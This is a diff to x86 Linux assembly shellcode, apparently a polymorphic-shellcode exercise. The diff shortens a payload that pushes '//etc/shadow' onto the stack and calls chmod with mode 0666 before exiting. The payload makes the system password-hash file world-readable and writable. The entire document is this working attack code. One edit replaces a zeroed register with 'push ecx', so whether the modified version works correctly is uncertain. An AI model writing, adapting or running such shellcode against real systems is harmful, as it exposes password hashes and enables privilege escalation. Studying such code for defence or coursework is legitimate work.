@@ -4,7 +4,7 @@
 
 ;Original Lenght: 25
 
-;Polymorphic version: 25 with good exit
+;Polymorphic version: 24 with good exit
 
 global _start 
 
@@ -16,8 +16,8 @@ _start:
         ;mov al, 0xf ;15  Original line
 	push 0xf ;Mofidied line
 	pop eax  ;Modified line       
-	cdq
-        push edx
+	;cdq
+        push ecx;push edx
         push dword 0x776f6461
 	push dword 0x68732f63
         push dword 0x74652f2f
@@ -26,8 +26,8 @@ _start:
 	push 0x1b6
 	pop ecx    
 	int 0x80
-	 push 0x1
+	push 0x1
 	pop eax
-	;mov eax,0x1 ;Original code doesnt have exit function
+	;Original code doesnt have exit function
 	int 0x80 
 
